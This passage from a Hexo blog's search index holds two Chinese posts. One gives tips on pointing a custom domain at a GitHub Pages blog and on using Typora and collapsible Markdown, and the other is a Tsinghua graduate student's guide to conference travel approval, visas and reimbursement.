src="/2020/06/01/build-blog/domain.jpg" srcset="/img/loading.gif" width="40%" height="40%" alt="oauth"></div><div align="center">  <img src="/2020/06/01/build-blog/reg.jpg" srcset="/img/loading.gif" width="70%" height="70%" alt="oauth"></div><p>进入后，查询你喜欢的关键字相关的域名的注册情况，选择中意的域名就可以交钱了。最终付款之前还需要一些身份认证。</p><div align="center">  <img src="/2020/06/01/build-blog/buy.jpg" srcset="/img/loading.gif" width="60%" height="60%" alt="oauth"></div><p>购买成功，认证通过后，在已有域名那里，点击“解析”，添加解析规则。这里添加的IP地址是之前deepdeer.github.io的解析情况，可以通过各类IP或域名查询网站找到，比如<a href="https://site.ip138.com/" target="_blank" rel="noopener">这里</a>。注意下面要加上一条CNMA规则。</p><div align="center">  <img src="/2020/06/01/build-blog/map.jpg" srcset="/img/loading.gif" width="100%" height="100%" alt="oauth"></div><div align="center">  <img src="/2020/06/01/build-blog/ip.jpg" srcset="/img/loading.gif" width="100%" height="100%" alt="oauth"></div><p>另外，在Github仓库的Settings里，需要加上“Custom domain”，保存配置后，会自动生成名为CNAME的文件，内容如下。但需要注意的是，每次我们重新部署时，使用deploy clean再generate后，会清除掉这个CNAME文件。为解决这个问题，可以把CNAME文件放到博客的“source”文件夹中。</p><div align="center">  <img src="/2020/06/01/build-blog/cname.jpg" srcset="/img/loading.gif" width="70%" height="70%" alt="oauth"></div><h3 id="四-其它小经验"><a href="#四-其它小经验" class="headerlink" title="四. 其它小经验"></a>四. 其它小经验</h3><h4 id="1-Markdown编辑器推荐"><a href="#1-Markdown编辑器推荐" class="headerlink" title="1.Markdown编辑器推荐"></a>1.Markdown编辑器推荐</h4><p>这些博客都是用<a href="https://www.typora.io/" target="_blank" rel="noopener">Typora</a>写的。该软件界面简洁，即时效果，很好用，推荐~</p><p>Typora除了支持公式块之外，还支持行内公式，在偏好设置中勾选”内联公式“即可。</p><div align="center">  <img src="/2020/06/01/build-blog/gongshi.jpg" srcset="/img/loading.gif" width="50%" height="50%" alt="oauth"></div><h4 id="2-Markdown中内容折叠"><a href="#2-Markdown中内容折叠" class="headerlink" title="2.Markdown中内容折叠"></a>2.Markdown中内容折叠</h4><p>有时文章内容过多不便于显示，可以使用如下语法进行折叠</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">details</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">summary</span>&gt;</span>可显示的标题<span class="hljs-tag">&lt;/<span class="hljs-name">summary</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>   折叠内容  <span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">details</span>&gt;</span></code></pre><p>比如</p><div align="center">  <img src="/2020/06/01/build-blog/zhedie.jpg" srcset="/img/loading.gif" width="100%" height="100%" alt="oauth"></div><p>效果如下，点击后显示黑色部分</p><div align="center">  <img src="/2020/06/01/build-blog/xiaoguo.jpg" srcset="/img/loading.gif" width="100%" height="100%" alt="oauth"></div><p>如果有其它的坑，欢迎大家评论补充，谢谢！</p>]]></content>
    
    
    <categories>
      
      <category>工程技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>教程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>THU研究生国际会议出行准备流程</title>
    <link href="/2020/05/30/baoxiao/"/>
    <url>/2020/05/30/baoxiao/</url>
    
    <content type="html"><![CDATA[<p>下文仅限清华大学网络科学与网络空间研究院研究生同学使用，包含护照、签证、报销等</p><p>（邓峰基金部分持续更新….）</p><blockquote><p>提示：出国手续涉及部门较多，请尽早准备提前办理。如遇假期会有所调整，要关注邮件通知~</p></blockquote><h3 id="首先"><a href="#首先" class="headerlink" title="首先"></a>首先</h3><p>​        你要有个<strong>护照</strong>，如果没有，办理的时候把发票留好，可以报销。</p><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><p>注册会议并拿到<strong>邀请函</strong></p><p>预定<strong>机票和酒店</strong>（办签证使用）。目前携程等网站貌似不再支持付款前先打印行程单。</p><ol><li>机票时间，一般可定在会议安排往前往后各一天。有特殊情况，赶在自己文章汇报前到达即可。</li><li>酒店一般订会议推荐的，预定前注意一下学校给的当地住宿报销额度。有些会议官网会贴出提前订酒店有优惠的通知，发邮件过去即可。</li></ol><h3 id="学校审批"><a href="#学校审批" class="headerlink" title="学校审批"></a>学校审批</h3><h4 id="1-gt-申请出国批件"><a href="#1-gt-申请出国批件" class="headerlink" title="1&gt;申请出国批件"></a>1&gt;申请出国批件</h4><ol><li><p>首先在info上进行申请，找“出国出境申报”——&gt;“因公出国（境）申报系统（新）</p><div align="center"><img src="/2020/05/30/baoxiao/apply.jpg" srcset="/img/loading.gif" width="70%" height="70%" alt="oauth"></div></li><li><p>进入系统后，选择”新申请”，点击“我已阅读”，在因公出境申请表上填写信息，其中会<strong>比较犹豫的几个字段</strong>有：</p></li></ol><ul><li>出访基本信息：出入境时间大概在会议日程往前往后各一天，离境、入境时间是否需要过境等如实填写即可</li><li>出访类别：单位公派，会议</li><li>出访经费：费用来源一般选择“全部校内支付”，“纵向科研经费”，校内支付，人民币（大致写一个费用即可）</li><li>日程计划：简单填写就行，比如出发，抵达，开会，回程等等（可适当扩展）</li></ul><ol start="3"><li><p>提交之后会有一个预算表，大概可以看到给当地的住宿、日常消费额度等。这类信息也可以在边栏中“预算、外汇与报销”的“政策与标准”的表格中看到。</p><div align="center">  <img src="/2020/05/30/baoxiao/biaozhun.jpg" srcset="/img/loading.gif" alt="oauth" style="zoom:40%;"></div></li><li><p>“报批材料”里上传会议的邀请函和论文录用证明。</p></li><li><p>点击提交，打印申请表，这个表需要自己和导师签字。</p></li><li><p>提交完成后，返回主界面会显示出当前进度，完成后圆圈会变绿。大概两周左右“单位审核”会变绿。等到“学校审批”通过，显示批件下达之后，可以下载电子版。</p></li></ol><div align="center">  <img src="/2020/05/30/baoxiao/jindu.jpg" srcset="/img/loading.gif" alt="oauth" style="zoom:40%;"></div><h4 id="2-gt-批件领取"><a href="#2-gt-批件领取" class="headerlink" title="2&gt;批件领取"></a>2&gt;批件领取</h4><p>去国际处，在李兆基4楼（可以进楼的门有点多，但失之毫厘谬以千里，所以可以问下保安…）</p><p>去之前先准备一份<strong>“派出证明”</strong>。还是在刚刚的出入境申请系统的边栏里面。点击进去下载对应模板，注意老师们已经用最直接醒目的方法标示出的<strong>注意事项</strong>。</p><div align="center">  <img src="/2020/05/30/baoxiao/chat.jpg" srcset="/img/loading.gif" alt="oauth" style="zoom:40%;"></div><div align="center">  <img src="/2020/05/30/baoxiao/chats.jpg" srcset="/img/loading.gif" width="60%" height="60%" alt="oauth"></div><div align="center">  <img src="/2020/05/30/baoxiao/attention.jpg" srcset="/img/loading.gif" width="60%" height="60%" alt="oauth"></div><p>在国际处主要有以下<strong>几个事情</strong>：</p><ul><li>拿批件</li><li>拿外汇预算单</li><li>派出证明需要盖章</li><li>如果办签证时需要单位法人证明一类的材料，需要<strong>主动</strong>和老师提及</li></ul><h3 id="签证办理"><a href="#签证办理" class="headerlink" title="签证办理"></a>签证办理</h3><p>这个就要看去哪个国家了，我以希腊为例，需要申根签，可以先在官网上填写表格申请，然后按照里面写的去依次准备材料。去使馆办事处。一定要注意时间，选最最最是工作时间的时段过去。我第一去的时候好像是下午3点左右到的，说是刚刚停止办理…</p><p>其它细节事项：</p><ol><li><p>保险可以直接在淘宝上买，搜“申根保险”就可以，看清楚额度是否符合要求；</p></li><li><p>户口页，如果户口在学校的话，直接在info上申请，”集体户口卡借阅”，里面包括“借阅预约”和“首页打印”。预约之后直接去地图里圈出的小房子（保卫处）里拿就好了；</p><div align="center"><img src="/2020/05/30/baoxiao/hukou.jpg" srcset="/img/loading.gif" width="60%" height="60%" alt="oauth"></div></li><li><p>银行对账单可以直接在C楼打印；</p></li><li><p>在读证明，在info上预约然后直接与三教打印（貌似改到了六教？，反正C楼应该都是万能的）；</p><div align="center"><img src="/2020/05/30/baoxiao/zaidu.jpg" srcset="/img/loading.gif" width="60%" height="60%" alt="oauth"></div></li><li><p>办理签证最后需要交纳现金。留好发票，这个在报销范围内。</p></li></ol><h3 id="出行及报销"><a href="#出行及报销" class="headerlink" title="出行及报销"></a>出行及报销</h3><ol><li><p>行程中尽量保存好<strong>所有票据</strong>，回来整理<strong>报销</strong>。（我都是先垫付再报销，据说还可以先去学校<strong>借款</strong>）</p><p>各类车票，登机牌，行程单，机票购买记录及发票（让网站寄过来），酒店账单/发票，会议注册费发票等</p></li><li><p>去首都机场的话，清华科技园那里有大巴，车费是30块？这种貌似属于城建交通，也可以报销，不行的话，也有日常杂费可以cover掉。</p></li><li><p>回来后的报销主要是填写一个报销表格，还是在刚刚的出入境申报系统的边栏上的“表格下载”里，选择<strong>”报销表格下载“</strong>，表格如下图，里面也标明了一些报销流程和注意事项；</p><div align="center"><img src="/2020/05/30/baoxiao/baoxiaochat.jpg" srcset="/img/loading.gif" width="60%" height="60%" alt="oauth"></div></li></ol><div align="center">  <img src="/2020/05/30/baoxiao/items.jpg" srcset="/img/loading.gif" width="60%" height="60%" alt="oauth"></div><ol start="4"><li><p>其它细节事项</p><ul><li>大额机票需要发票验真，通过官网或发票自带的网站都可以，截图打印</li><li>打印护照的出入境记录页</li><li>提供交易记录截图（微信通知，短信账单，订单等均可）</li><li>在发票上签字需要用<strong>油笔</strong></li></ul><p>我们组的报销可以去对门实验室请教<strong>乔老师</strong>，老师会给予很多帮助，在此表示感谢~</p></li></ol><p>本文凭借对半年前的回忆整理，如有疏漏，欢迎大家评论指正！</p>]]></content>
    
    
    <categories>
      
      <category>办公事务</category>
      
    </categories>
    
    
    <tags>
      
      <tag>教程</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
